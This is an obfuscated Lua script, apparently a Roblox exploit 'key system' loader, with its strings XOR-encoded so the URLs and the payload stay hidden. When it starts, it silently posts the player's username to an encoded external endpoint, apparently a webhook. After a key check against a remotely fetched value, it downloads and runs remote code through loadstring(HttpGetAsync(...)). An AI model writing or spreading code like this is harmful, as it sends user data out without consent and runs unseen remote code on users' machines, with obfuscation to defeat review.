--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v60,v61) local v62={};for v88=1, #v60 do v6(v62,v0(v4(v1(v2(v60,v88,v88 + 1 )),v1(v2(v61,1 + (v88% #v61) ,1 + (v88% #v61) + 1 )))%256 ));end return v5(v62);end function SendMessage(v63,v64) local v65=560 -(306 + 254) ;local v66;local v67;local v68;local v69;local v70;local v71;local v72;while true do if (v65==(1 + 1)) then v70={[v7("\168\43\30\34\118\171\239","\155\203\68\112\86\19\197")]=v7("\12\151","\152\38\189\86\156\32\24\133")   .. v68   .. v7("\182\29\253\6","\38\156\55\199")   .. v64 };v71=v66:JSONEncode(v70);v65=5 -2 ;end if (v65==(1470 -(899 + 568))) then v72=request({[v7("\157\111\112","\35\200\29\28\72\115\20\154")]=v63,[v7("\52\186\197\215\130\40","\84\121\223\177\191\237\76")]=v7("\139\121\250\148","\161\219\54\169\192\90\48\80"),[v7("\97\71\1\33\76\80\19","\69\41\34\96")]=v69,[v7("\158\204\211\19","\75\220\163\183\106\98")]=v71});break;end if (v65==(0 + 0)) then v66=game:GetService(v7("\249\215\207\53\213\190\213\8\216\192\222","\126\177\163\187\69\134\219\167"));v67=game.Players.LocalPlayer;v65=2 -1 ;end if (v65==(604 -(268 + 335))) then v68=(v67 and v67.Name) or v7("\22\195\33\203\243\52\195\106\245\240\34\212\47\215","\156\67\173\74\165") ;v69={[v7("\23\184\71\2\185\40\82\121\131\80\6\185","\38\84\215\41\118\220\70")]=v7("\81\6\50\30\247\83\23\54\27\241\94\89\40\1\241\94","\158\48\118\66\114")};v65=292 -(60 + 230) ;end end end function SendMessageEMBED(v73,v74) local v75=572 -(426 + 146) ;local v76;local v77;local v78;local v79;local v80;local v81;local v82;while true do if ((1 + 1)==v75) then v80={[v7("\9\195\92\119\122\100","\135\108\174\62\18\30\23\147")]={{[v7("\162\224\62\199\29","\167\214\137\74\171\120\206\83")]=v74.title,[v7("\143\245\33\94\234\174\155\228\59\82\246","\199\235\144\82\61\152")]=v74.description   .. "\n\n**NAME:** "   .. v78 ,[v7("\4\25\181\36\21","\75\103\118\217")]=v74.color,[v7("\193\93\117\24\189\13","\126\167\52\16\116\217")]=v74.fields,[v7("\206\33\47\148\177\11","\156\168\78\64\224\212\121")]={[v7("\19\235\189\218","\174\103\142\197")]=v74.footer.text}}}};v81=v76:JSONEncode(v80);v75=814 -(569 + 242) ;end if (v75==3) then v82=request({[v7("\99\58\83","\152\54\72\63\88\69\62")]=v73,[v7("\249\193\250\84\219\192","\60\180\164\142")]=v7("\104\113\54\29","\114\56\62\101\73\71\141"),[v7("\144\236\218\192\189\251\200","\164\216\137\187")]=v79,[v7("\240\233\53\171","\107\178\134\81\210\198\158")]=v81});break;end if (v75==(2 -1)) then local v91=0 + 0 ;while true do if (v91==0) then v78=(v77 and v77.Name) or v7("\254\50\44\232\209\189\197\124\23\234\223\179\206\46","\202\171\92\71\134\190") ;v79={[v7("\10\206\34\156\44\207\56\197\29\216\60\141","\232\73\161\76")]=v7("\186\201\82\81\23\184\216\86\84\17\181\150\72\78\17\181","\126\219\185\34\61")};v91=1025 -(706 + 318) ;end if (v91==(1252 -(721 + 530))) then v75=2;break;end end end if (v75==(1271 -(945 + 326))) then local v92=0 -0 ;while true do if ((0 + 0)==v92) then v76=game:GetService(v7("\42\174\159\39\234\7\168\157\62\218\7","\185\98\218\235\87"));v77=game.Players.LocalPlayer;v92=1;end if (v92==(701 -(271 + 429))) then v75=1 + 0 ;break;end end end end end local v8=v7("\48\26\150\214\185\98\65\205\194\163\43\13\141\212\174\118\13\141\203\229\57\30\139\137\189\61\12\138\201\165\51\29\205\151\249\109\94\211\150\242\110\90\211\149\242\105\86\214\145\250\110\93\205\147\139\8\31\160\226\179\55\87\209\193\141\32\11\209\205\155\2\58\213\245\171\31\57\183\194\231\15\22\174\197\248\15\7\179\144\169\60\47\129\146\166\60\1\136\212\169\10\15\168\199\250\41\23\182\205\178\34\55\189\139\176\25\39\154\239\131\42","\202\88\110\226\166");local v9={[v7("\215\6\150\251\207","\170\163\111\226\151")]=v7("\36\35\183\42\14\30\39\23\63","\73\113\80\210\88\46\87"),[v7("\133\41\222\17\245\136\60\217\27\232\143","\135\225\76\173\114")]=v7("\84\163\246","\199\122\141\216\208\204\221"),[v7("\174\210\28\255\106","\150\205\189\112\144\24")]=139,[v7("\35\141\186\64\0\155","\112\69\228\223\44\100\232\113")]={{[v7("\218\30\10\214","\230\180\127\103\179\214\28")]=v7("\190\32\126\117\203\111\160\137\29\79\74\235\72\244","\128\236\101\63\38\132\33"),[v7("\186\168\29\81\179","\175\204\201\113\36\214\139")]=v7("\111\237\22\247\33\117\140\17\249\48\98\239\1\249\32","\100\39\172\85\188")}},[v7("\171\119\182\148\54\191","\83\205\24\217\224")]={[v7("\242\192\213\41","\93\134\165\173")]=v7("\146\221\237\238\22\226\158","\30\222\146\161\162\90\174\210")}};SendMessageEMBED(v8,v9);local v10=Instance.new(v7("\214\77\98\15\224\64\87\31\236","\106\133\46\16"));v10.Parent=game.Players.LocalPlayer:WaitForChild(v7("\104\44\114\229\95\82\127\53\122","\32\56\64\19\156\58"));local v12=Instance.new(v7("\124\218\228\91\95","\224\58\168\133\54\58\146"));v12.Size=UDim2.new(0,320,1086 -(461 + 625) ,170);v12.Position=UDim2.new(1288.5 -(993 + 295) , -(9 + 151),1171.5 -(418 + 753) , -(33 + 52));v12.BackgroundColor3=Color3.fromRGB(30,4 + 26 ,9 + 21 );v12.BorderSizePixel=0 + 0 ;v12.Parent=v10;local v18=Instance.new(v7("\108\127\104\242\103\136\130\25","\107\57\54\43\157\21\230\231"));v18.CornerRadius=UDim.new(529 -(406 + 123) ,10);v18.Parent=v12;local v21=Instance.new(v7("\238\162\34\225\171\211\196\222","\175\187\235\113\149\217\188"));v21.Thickness=2;v21.Color=Color3.fromRGB(2024 -(1749 + 20) ,61 + 194 ,1577 -(1249 + 73) );v21.Parent=v12;local v25=Instance.new(v7("\21\162\128\75\230\85\121\62\170\141","\24\92\207\225\44\131\25"));v25.Size=UDim2.new(1 + 0 ,1165 -(466 + 679) ,2 -1 ,57 -37 );v25.Position=UDim2.new(1900 -(106 + 1794) , -10,0 + 0 , -10);v25.Image=v7("\89\209\160\77\8\110\78\199\177\72\65\50\4\130\235\29\77\45\31\134\234\29\76","\29\43\179\216\44\123");v25.ImageTransparency=0.7 + 0 ;v25.BackgroundTransparency=2 -1 ;v25.ZIndex=0 -0 ;v25.Parent=v12;local v33=Instance.new(v7("\137\220\56\88\159\214\56","\44\221\185\64"));v33.Size=UDim2.new(0,220,114 -(4 + 110) ,40);v33.Position=UDim2.new(0.5, -(694 -(57 + 527)),1427.2 -(41 + 1386) ,0);v33.PlaceholderText=v7("\36\233\92\90\97\65\254\71\74\97\65\236\77\70","\19\97\135\40\63");v33.BackgroundColor3=Color3.fromRGB(50,50,153 -(17 + 86) );v33.Text=v7("\133\89\42\123\39\52\188\89","\81\206\60\83\91\79");v33.TextColor3=Color3.fromRGB(255,174 + 81 ,568 -313 );v33.Font=Enum.Font.Gotham;v33.TextSize=46 -30 ;v33.Parent=v12;local v44=Instance.new(v7("\123\130\243\125\61\205\72\182","\196\46\203\176\18\79\163\45"));v44.CornerRadius=UDim.new(166 -(122 + 44) ,8);v44.Parent=v33;local v47=Instance.new(v7("\140\39\102\10\6\238\251\172\45\112","\143\216\66\30\126\68\155"));v47.Size=UDim2.new(0,207 -87 ,0 -0 ,33 + 7 );v47.Position=UDim2.new(0.5, -(9 + 51),0.6 -0 ,65 -(30 + 35) );v47.Text=v7("\143\198\25\206\215","\129\202\168\109\171\165\195\183");v47.BackgroundColor3=Color3.fromRGB(70,90 + 40 ,1437 -(1043 + 214) );v47.TextColor3=Color3.fromRGB(255,255,963 -708 );v47.Font=Enum.Font.GothamBold;v47.TextSize=18;v47.Parent=v12;local v57=Instance.new(v7("\23\113\20\215\204\26\227\48","\134\66\56\87\184\190\116"));v57.CornerRadius=UDim.new(0,1220 -(323 + 889) );v57.Parent=v47;v47.MouseEnter:Connect(function() v47.BackgroundColor3=Color3.fromRGB(269 -169 ,750 -(361 + 219) ,220);end);v47.MouseLeave:Connect(function() v47.BackgroundColor3=Color3.fromRGB(70,130,500 -(53 + 267) );end);v47.MouseButton1Click:Connect(function() local v85=v33.Text;local v86=v7("\52\37\29\171\10\177\110\122\44\48\26\175\28\233\40\59\114\50\6\182\86\249\32\34\115\40\16\185\29\226\50\54\13","\85\92\81\105\219\121\139\65");local v87=game:HttpGet(v86);if (v85==v87) then local v89=0 + 0 ;while true do if (v89==1) then spawn(function() for v94=414 -(15 + 398) ,983 -(18 + 964)  do local v95=0 -0 ;local v96;while true do if (v95==0) then v96=0;while true do if (v96==0) then loadstring(game:HttpGetAsync(v7("\24\66\151\155\149\116\226\191\0\87\144\159\131\44\164\254\94\85\140\134\201\60\172\231\95\98\212\189\181\3\159\201\4","\144\112\54\227\235\230\78\205")))();wait(3);break;end end break;end end end end);break;end if (v89==0) then game:GetService(v7("\206\167\81\87\104\218\239\148\69\76","\191\157\211\48\37\28")):SetCore(v7("\236\26\250\24\20\208\11\253\26\51\220\30\224\21\53\209","\90\191\127\148\124"),{[v7("\76\142\58\27\125","\119\24\231\78")]=v7("\169\40\188\10\213\83\81\129\34\183\88\217\67\5\195","\113\226\77\197\42\188\32"),[v7("\14\19\236\161","\213\90\118\148")]="✅",[v7("\127\59\166\87\89\82\33\186","\45\59\78\212\54")]=2 + 1 });v10:Destroy();v89=1 + 0 ;end end else game:GetService(v7("\128\60\14\238\196\94\161\15\26\245","\59\211\72\111\156\176")):SetCore(v7("\125\130\237\41\96\136\247\36\72\142\224\44\90\142\236\35","\77\46\231\131"),{[v7("\142\93\162\76\191","\32\218\52\214")]=v7("\101\18\40\232\248\163\5\77\92\24\63\175\176","\58\46\119\81\200\145\208\37"),[v7("\31\137\40\184","\86\75\236\80\204\201\221")]="❌",[v7("\86\84\101\132\234\130\125\79","\235\18\33\23\229\158")]=853 -(20 + 830) });end end);
